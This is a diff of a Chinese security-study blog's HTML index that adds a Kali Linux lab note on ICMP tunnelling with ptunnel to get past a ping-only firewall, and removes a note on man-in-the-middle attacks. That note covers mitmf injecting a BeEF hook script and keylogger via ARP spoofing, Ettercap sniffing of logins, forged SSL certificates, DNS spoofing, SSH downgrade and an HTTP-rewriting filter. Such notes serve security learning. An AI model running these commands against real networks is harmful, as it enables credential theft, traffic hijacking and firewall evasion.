@@ -240,6 +240,266 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%89)%EF%BC%9AICMP%E9%9A%A7%E9%81%93--ptunnel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%89)%EF%BC%9AICMP%E9%9A%A7%E9%81%93--ptunnel/" itemprop="url">Kali Linux笔记(七十三)：ICMP隧道--ptunnel</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-02T20:51:22+08:00">
+                2020-02-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  427 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-ptunnle"><a href="#1-ptunnle" class="headerlink" title="1. ptunnle"></a>1. ptunnle</h4><ul>
+<li>Ping tunnel ICMP隧道工具<ul>
+<li>通过ICMP echo（ping requests，8）和reply（ping reply，0）实现隧道</li>
+<li>适用于防火墙只允许ping出站流量的环境</li>
+<li>支持多并发连接、性能优</li>
+<li>支持身份验证</li>
+<li>需要root权限</li>
+<li>支持抓包<ul>
+<li>Win：winpcap</li>
+<li>Linux：libpcap</li>
+</ul>
+</li>
+<li>工作过程（指定Proxy的时候，需要指定目的地，客户端指定）<ul>
+<li>Proxy、Client、Destination</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>服务器<ul>
+<li><strong><code>🔺命令：ptunnel -x 1234</code></strong>  </li>
+</ul>
+</li>
+<li>客户端<ul>
+<li><strong><code>🔺命令：sudo ptunnel -p proxy -lp 2222 -da destination -dp 22 -x 1234</code></strong>  </li>
+</ul>
+</li>
+<li>嵌套SSH隧道<ul>
+<li><strong><code>🔺命令：ssh -CNfg -D 7000 root@127.0.0.1 -p 2222</code></strong>  </li>
+</ul>
+</li>
+<li>▲ ptunnel直到目前的最新版仍存在拒绝服务漏洞<ul>
+<li>0.72</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=8ba4_1t-c8RHceWGXkik2ykLxyWEAjf4TnqoBi1zNfQVEBnHS9tbhe5OUuKYQrJUxXj3mkDJmjX3ZxXSZMWEtq5jNn6k0yiKkppgwTjp3MatPGpboLWVGw&file_name=/ptunnle.PNG" alt="ptunnel工作过程"></p>
+<h4 id="2-实验环境准备"><a href="#2-实验环境准备" class="headerlink" title="2. 实验环境准备"></a>2. 实验环境准备</h4><ul>
+<li>Kali（Proxy&amp;Destinatiom）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Mono防火墙<ul>
+<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
+</ul>
+</li>
+<li>Kali（内网）<ul>
+<li>网卡方式为Host-only方式，检查网络</li>
+<li>浏览器访问mono，检查防火墙规则<ul>
+<li>Protocol → ICMP</li>
+<li>Sourece → LAN subnet</li>
+<li>LAN DNS -&gt; WAM PING</li>
+</ul>
+</li>
+<li>ping/上网尝试</li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>网卡方式为Host-only方式，检查网络</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h4><ul>
+<li>Kali（Proxy&amp;Destinatiom）<ul>
+<li>服务器：<strong><code>🔺命令：ptunnel -x 1234</code></strong> </li>
+<li>启动Wireshark抓包，查看发送的数据包内容（ICMP数据包）</li>
+</ul>
+</li>
+<li>Kali（内网）<ul>
+<li><strong><code>🔺命令：sudo ptunnel -h</code></strong> </li>
+<li>客户端：<strong><code>🔺命令：sudo ptunnel -p Kali的IP -lp 2222 -da 192.168.0.1 -dp 80 -x 1234</code></strong>  </li>
+<li>浏览器访问127.0.0.1:2222进行尝试</li>
+</ul>
+</li>
+<li>Kali（Proxy&amp;Destinatiom）<ul>
+<li>开启SSH（修改SSH配置文件）</li>
+</ul>
+</li>
+<li>Kali（内网）<ul>
+<li><strong><code>🔺命令：sudo ptunnel -p Kali的IP -lp 2222 -da Kali的IP -dp 22 -x 1234</code></strong> </li>
+<li><strong><code>🔺命令：ssh -CNfg -D 7000 root@127.0.0.1 -p 2222</code></strong> </li>
+</ul>
+</li>
+<li>Window XP SP3<ul>
+<li>设置浏览器Internet代理，用内网Kali的IP:7000，上网尝试</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%BA%8C)%EF%BC%9A%E9%9A%A7%E9%81%93%E4%BC%A0%E8%BE%93%E5%B7%A5%E5%85%B7--SOCAT/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2883,422 +3143,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%89)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%89)%EF%BC%9A%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" itemprop="url">Kali Linux笔记(六十三)：密码嗅探--中间人攻击</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-27T23:12:02+08:00">
-                2020-01-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1.8k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  8 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
-<li>注入XSS<ul>
-<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
-<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
-<li>一旦得手，影响范围巨大 </li>
-<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
-</ul>
-</li>
-</ul>
-<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
-<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
-<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
-<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
-<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
-<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
-<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
-<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
-</ul>
-</li>
-<li>启动beef <ul>
-<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
-<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
-</ul>
-</li>
-<li>mitmf中间人注入xss脚本（结合Beef）<ul>
-<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
-</ul>
-</li>
-<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
-<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
-<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
-<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
-<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
-<li>–hsts（新的安全协议）<ul>
-<li>HTTP Strict Transport Security </li>
-<li>防止协议降级、cookie窃取 </li>
-<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
-<li>限制user-agent、https等</li>
-</ul>
-</li>
-<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
-<li>凌空插后门 </li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
-<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
-<li>统一的中间人攻击工具 </li>
-<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
-<li>支持SSH1、SSL中间人攻击</li>
-</ul>
-</li>
-<li>模块划分 <ul>
-<li>Snifer </li>
-<li>MITM </li>
-<li>Filter </li>
-<li>Log </li>
-<li>Plugin</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
-<li>Snifer<ul>
-<li>负责数据包转发</li>
-<li>Unified<ul>
-<li>单网卡情况下独立完成三层包转发</li>
-<li>始终禁用内核IP_Forward功能</li>
-</ul>
-</li>
-<li>Bridge <ul>
-<li>双网卡情况下的一层MITM模式</li>
-<li>可作为IPS过滤数据包</li>
-<li>不可在网关上使用（透明网桥）</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
-<li>MITM <ul>
-<li>把流量重定向到ettercap主机上 </li>
-<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
-</ul>
-</li>
-<li>实现MITM的方法 <ul>
-<li>ARP（一般为动态类型的ARP表）</li>
-<li>ICMP <ul>
-<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
-<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
-</ul>
-</li>
-<li>DHCP <ul>
-<li>修改网关地址，半双工，回包不经过Kali</li>
-<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
-<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
-</ul>
-</li>
-<li>Switch Port Stealing（交换机端口窃取）<ul>
-<li>交换机根据源MAC地址更新</li>
-<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
-<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
-<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
-</ul>
-</li>
-<li>NDP <ul>
-<li>IPv6协议欺骗技术</li>
-<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
-<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
-<li>Ettercap使用ARP request包进行攻击 </li>
-</ul>
-</li>
-<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
-<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
-</ul>
-</li>
-</ul>
-<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
-<li>用户操作界面 <ul>
-<li>-T 文本界面（文本字符）</li>
-<li>-G 图形界面 </li>
-<li>-C 基于文本的图形界面（文本类似图形化）</li>
-<li>-D 后台模式 </li>
-</ul>
-</li>
-<li>指定目标 <ul>
-<li>IPv4：MAC/IPv4/Ports </li>
-<li>IPv6：MAC/IPv4/IPv6/Ports </li>
-<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
-</ul>
-</li>
-<li>权限 <ul>
-<li>主配置文件：/etc/ettercap/etter.conf</li>
-<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
-<li>日志写入目录需要nobody有写入权 </li>
-<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
-</ul>
-</li>
-<li>基于伪造证书的SSL MITIM <ul>
-<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
-<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
-<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
-<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
-<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
-<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
-<li>参数<ul>
-<li>-M（MITM技术）</li>
-<li>-F（过滤器）</li>
-<li>-P（模块）</li>
-<li>-w（网络流量记录）</li>
-<li>-l（简单记录日志）</li>
-<li>-L（记录所有日志信息）</li>
-<li>-m（账号密码信息）</li>
-<li>-q（安静模式/有用的信息）</li>
-</ul>
-</li>
-<li>MITM攻击<ul>
-<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
-<li>找一个FTP服务器</li>
-<li>输入账号/密码</li>
-<li>查看ettercap字符界面</li>
-</ul>
-</li>
-<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
-<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
-<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
-<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
-<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
-<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
-<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
-<li>Sniff → Unified/Bridge sniffing → 网卡</li>
-<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
-<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
-<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
-<li>Start → Start sniffing</li>
-<li>找一个FTP服务器</li>
-<li>输入账号/密码</li>
-<li>查看ettercap图形界面</li>
-</ul>
-<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
-<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
-<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
-<li>Sniff → Unified/Bridge sniffing → 网卡</li>
-<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
-<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
-<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
-<li>Start → Start sniffing</li>
-<li>找一个有SSL页面</li>
-<li>输入账号/密码</li>
-<li>查看ettercap图形界面</li>
-</ul>
-</li>
-</ul>
-<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
-<li>DNS欺骗（图形界面） <ul>
-<li>dns_spoof插件配置文件 </li>
-<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
-<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
-<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
-<li>Sniff → Unified/Bridge sniffing → 网卡</li>
-<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
-<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
-<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
-<li>Start → Start sniffing</li>
-<li>找一个有SSL页面</li>
-<li>输入账号/密码</li>
-<li>查看ettercap图形界面</li>
-</ul>
-</li>
-<li>DNS欺骗（字符界面）<ul>
-<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
-<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
-<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
-<li>Filter <ul>
-<li>/usr/share/ettercap/</li>
-<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
-<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
-<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
-<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
-<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
-</ul>
-</li>
-<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123; </span><br><span class="line">     msg(&quot;data on TCP 80\n&quot;); </span><br><span class="line">         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3353,7 +3197,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">149</span>
+                  <span class="site-state-item-count">150</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3460,7 +3304,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">134k</span>
+    <span title="Site words total count">134.5k</span>
   
 </div>
 
